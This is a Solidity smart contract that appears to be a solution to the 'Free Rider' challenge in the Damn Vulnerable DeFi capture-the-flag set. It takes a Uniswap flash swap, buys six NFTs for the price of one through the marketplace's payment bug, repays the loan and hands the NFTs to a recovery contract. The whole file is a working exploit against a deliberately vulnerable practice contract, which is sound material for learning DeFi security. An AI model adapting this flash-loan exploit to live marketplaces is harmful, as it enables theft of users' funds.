// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

import "./FreeRiderNFTMarketplace.sol"; 
import "./FreeRiderRecovery.sol";
import "./WETH.sol";
import "./DamnValuableToken.sol";
// import "./DamnValuableNFT.sol"; -- already imported elsewhere

contract FreeRiderAttack is IERC721Receiver, IUniswapV2Callee {

    // constants
    uint256 public constant NFTPrice = 15 ether;

    // instances of needed contracts to interact with
    FreeRiderNFTMarketplace public marketplace;
    FreeRiderRecovery public recovery;
    WETH public weth;
    DamnValuableToken public dvt;
    DamnValuableNFT public dvnft;

    // uniswap factory
    IUniswapV2Factory public uniswap;

    // keep track of owner
    address public owner;

    constructor (
        address payable _marketplaceAddr,
        address _recoveryAddr,
        address payable _wethAddr,
        address _dvtAddr,
        address _dvnftAddr,
        address _uniAddr
    ) {
        marketplace = FreeRiderNFTMarketplace(_marketplaceAddr);
        recovery = FreeRiderRecovery(_recoveryAddr);
        weth = WETH(_wethAddr);
        dvt = DamnValuableToken(_dvtAddr);
        dvnft = DamnValuableNFT(_dvnftAddr);
        uniswap = IUniswapV2Factory(_uniAddr);
        owner = msg.sender;
    }

    /**
     * function to be called to initiate the flash swap
     */
    function initiateSwap() external {
        require(msg.sender == owner, "Must be deployer of contract to call initiateSwap");
        // create uniswap pair
        IUniswapV2Pair uniPair = IUniswapV2Pair(uniswap.getPair(address(weth), address(dvt)));

        // weth = token0 and DVT = token1 --> perform flash swap wth NFTPrice of WETH & 0 DVT
        uniPair.swap(
            NFTPrice,
            0,
            address(this),  // send the tokens to this contract's uniswapV2Call function
            abi.encode(1)   // make the calldata param anything but 0 to trigger flash swap
        );
    }

    /**
     * Starts off with declaration from the Uniswap documentation https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
     * Convert WETH --> ETH
     * Buy 6 NFTs with the price of 1
     * Convert back to WETH + Uni fee
     * Send WETH back to the pool
     * @param sender token pair calling the contract 
     * @param amount0 address of first token
     * @param amount1 address of second token
     * @param data not needed in the function
     */
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        // initialize from documentation https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(msg.sender == uniswap.getPair(token0, token1)); // ensure that msg.sender is a V2 pair
        
        // convert our new WETH into ETH
        weth.withdraw(weth.balanceOf(address(this)));

        // buy the NFT 6 times with our 15 ETH
        // buyMany on the marketplace takes uint256[] calldata tokenIds as the argument
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) tokenIds[i] = i;
        marketplace.buyMany{ value: NFTPrice }(tokenIds);

        // figure out how much WETH we need to send back to uniswap and convert to WETH before sending back
        weth.deposit{ value: 15.1 ether }();               // 15 * 1.003 = 15.045 -- add a buffer too
        uint256 currBal = weth.balanceOf(address(this));
        weth.approve(msg.sender, currBal);
        weth.transfer(msg.sender, currBal);
    }

    // Send the NFTs back to the recovery address
    function sendNFTToRecovery() external {
        require(msg.sender == owner, "Must be deployer of contract to call sendNFTToRecovery");
        // need to encode the owner address in the data payload to create the right recipient in the recovery contract
        for (uint256 i = 0; i < 6; i++) dvnft.safeTransferFrom(address(this), address(recovery), i, abi.encode(owner));
    }

    // so that we can receive NFTs from the marketplace (it uses safeTransfer)
    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data) external pure override returns(bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // To withdraw the ether sent by marketplace
    function withdraw() public {
        require(msg.sender == owner, "Must be deployer of contract to call withdraw");
        payable(msg.sender).transfer(address(this).balance);
    }

    // to receive ETH
    receive() external payable {}
    fallback() external payable {}
}